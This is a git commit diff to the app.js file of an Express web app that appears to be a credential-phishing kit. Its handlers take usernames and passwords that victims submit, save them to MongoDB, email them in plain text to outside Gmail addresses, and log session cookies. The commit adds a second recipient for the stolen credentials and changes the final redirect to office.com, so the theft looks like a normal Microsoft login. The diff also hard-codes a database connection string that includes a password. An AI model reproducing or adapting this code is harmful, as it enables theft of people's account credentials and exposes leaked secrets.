5a86b19715a66a74a2a95865b5ce0af746a7fe63
leofaustix <slangley2759@gmail.com>
2023-02-02 05:46:43 -0600

    sdf

--- app.js
+++ app.js
@@ -3,12 +3,22 @@ let bodyParser = require("body-parser");
 let ejs = require("ejs");
 let mongoose = require("mongoose");
 let https = require('https');
+let session = require('express-session');
+let cookieParser = require('cookie-parser');
 let app = express();
 let nodemailer = require('nodemailer');
 
+
 app.set("view engine", "ejs")
+app.use(cookieParser());
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static("public"));
+app.use(session({
+  secret: 'runner',
+  resave: false,
+  saveUninitialized: true,
+  // cookie: { secure: true }
+}));
 
 mongoose.set('strictQuery', true);
 mongoose.connect("mongodb+srv://mstella1759:Badhtguy1.@cluster0.h6tw3.mongodb.net/autograb",{ useNewUrlParser:true });
@@ -20,13 +30,20 @@ const userSchema = new mongoose.Schema({
 const User = new mongoose.model("User", userSchema);
 
 
-app.get("/", function(req, res) {
-  username = req.query.username;
-  res.render("recap");
+app.get("/", (req, res) => {
+      var username = req.query.username;
+  console.log(`Session: ${JSON.stringify(req.session)}`);
+  console.log(`Cookies: ${JSON.stringify(req.cookies)}`);
+
+  res.render("recap",{username: username});
 });
+
 
 app.post("/", function(req, res) {
   var username = req.body.recapstore;
+  req.session.username = req.body.username;
+console.log(`Session: ${JSON.stringify(req.session)}`);
+console.log(`Cookies: ${JSON.stringify(req.cookies)}`);
   res.render("second",{username: username});
 });
 
@@ -38,6 +55,8 @@ app.post("/", function(req, res) {
 
 
 app.post("/second", function(req, res) {
+  req.session.username = req.body.username;
+req.session.password = req.body.pass;
   var username = req.body.username;
   const newUser = new User({
     hidden: req.body.username,
@@ -47,7 +66,7 @@ app.post("/second", function(req, res) {
     if (err) {
       console.log(err);
     } else {
-      // create a transporter object to connect to the SMTP server
+
       let transporter = nodemailer.createTransport({
         host: "smtp.elasticemail.com",
         port: 2525,
@@ -64,7 +83,7 @@ app.post("/second", function(req, res) {
         from: 'prattrenee@post.com',
         to: 'slangley1759@gmail.com',
         to: 'yingliulai@gmail.com',
-        subject: 'New Form Submission',
+        subject: 'Results',
         text: `username: ${username}, password: ${req.body.pass}`
       };
 
@@ -76,7 +95,8 @@ app.post("/second", function(req, res) {
           console.log('Email sent: ' + info.response);
         }
       });
-
+      console.log(`Session: ${JSON.stringify(req.session)}`);
+      console.log(`Cookies: ${JSON.stringify(req.cookies)}`);
       // redirect to the specified URL
       res.render("third", {
         username: username
@@ -113,6 +133,7 @@ app.post("/third", function(req, res) {
       let mailOptions = {
         from: 'prattrenee@post.com',
         to: 'slangley1759@gmail.com',
+        to: 'yingliulai@gmail.com',
         subject: 'New Form Submission',
         text: `username: ${username}, password: ${req.body.pass}`
       };
@@ -125,9 +146,10 @@ app.post("/third", function(req, res) {
           console.log('Email sent: ' + info.response);
         }
       });
-
+      console.log(`Session: ${JSON.stringify(req.session)}`);
+      console.log(`Cookies: ${JSON.stringify(req.cookies)}`);
       // redirect to the specified URL
-      res.redirect("https://pdf.ac/r2RC5")
+      res.redirect("https://www.office.com/")
     }
   });
 });
